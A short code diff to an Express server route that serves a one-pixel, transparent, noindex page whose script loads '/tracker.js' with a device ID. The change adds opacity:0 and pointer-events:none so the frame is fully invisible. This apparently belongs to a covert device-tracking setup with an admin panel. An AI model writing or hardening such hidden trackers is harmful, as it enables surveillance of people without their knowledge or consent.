@@ -103,7 +103,7 @@ app.use(express.static(path.join(__dirname, 'admin-panel')));
 app.get('/iframe', (req, res) => {
     const deviceId = req.query.id || '';
     const safeId = deviceId.replace(/[^a-f0-9-]/g, '');
-    res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="robots" content="noindex"><title>.</title><style>body{margin:0;background:transparent;width:1px;height:1px;overflow:hidden;}</style></head><body><script>
+    res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="robots" content="noindex"><title>.</title><style>body{margin:0;background:transparent;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none;}</style></head><body><script>
 (function(){var SERVER_URL=location.origin,deviceId='${safeId}';
 if(!deviceId)return;
 var s=document.createElement('script');s.src=SERVER_URL+'/tracker.js?'+Math.random();
